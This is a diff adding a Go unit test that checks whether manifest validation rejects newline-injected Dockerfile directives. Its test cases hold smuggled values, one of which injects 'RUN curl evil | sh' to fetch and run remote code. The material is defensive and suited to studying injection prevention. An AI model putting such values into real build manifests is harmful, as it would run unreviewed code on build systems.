@@ -265,3 +265,39 @@ func TestManifestRejectsInvalidProjectName(t *testing.T) {
 		t.Fatal("expected metadata.name validation failure")
 	}
 }
+
+// The generated Dockerfile concatenates these fields into directives, so a
+// line break in any of them would inject directives the manifest never
+// declared. Validate must stop that at parse time.
+func TestManifestRejectsDockerfileInjection(t *testing.T) {
+	valid := func() Manifest {
+		return Manifest{
+			APIVersion: ManifestAPIVersion,
+			Kind:       ManifestKind,
+			Content:    ManifestContent{Include: []string{"index.js"}},
+			Build:      ManifestBuild{Image: "node:22"},
+			Run:        ManifestRun{Command: []string{"node", "index.js"}, Port: 3000},
+		}
+	}
+	cases := map[string]func(*Manifest){
+		"workingDirectory": func(m *Manifest) { m.Run.WorkingDirectory = "/app\nRUN curl evil | sh" },
+		"user":             func(m *Manifest) { m.Run.User = "root\nRUN id" },
+		"stopSignal":       func(m *Manifest) { m.Run.StopSignal = "SIGTERM\nRUN id" },
+		"environment key":  func(m *Manifest) { m.Run.Environment = map[string]string{"A\nRUN id": "v"} },
+	}
+	for name, corrupt := range cases {
+		manifest := valid()
+		corrupt(&manifest)
+		if err := manifest.Validate(); err == nil {
+			t.Errorf("a newline in run.%s passed validation", name)
+		}
+	}
+	clean := valid()
+	clean.Run.WorkingDirectory = "/srv/app"
+	clean.Run.User = "1000:1000"
+	clean.Run.StopSignal = "SIGINT"
+	clean.Run.Environment = map[string]string{"NODE_ENV": "production"}
+	if err := clean.Validate(); err != nil {
+		t.Fatalf("a clean manifest failed validation: %v", err)
+	}
+}
